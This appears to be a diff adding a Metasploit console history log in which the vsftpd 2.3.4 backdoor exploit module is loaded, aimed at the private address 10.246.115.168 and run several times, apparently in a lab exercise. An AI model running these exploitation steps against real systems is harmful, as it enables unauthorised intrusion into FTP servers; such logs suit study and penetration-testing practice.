@@ -1,0 +1,24 @@
+msf exploit(unix/ftp/vsftpd_234_backdoor) > history
+1   info
+2   exit
+3   info
+4   run
+5   exit
+6   use 0
+7   info
+8   set rhost 10.246.115.168
+9   run
+10  set rhost 10.246.115.168
+11  run
+12  use 0
+13  info
+14  set rhost 10.246.115.168
+15  run
+16  msfconsole
+17  exit
+18  search vsftp
+19  use 1
+20  info
+21  set rhost 10.246.115.168
+22  run
+23  history
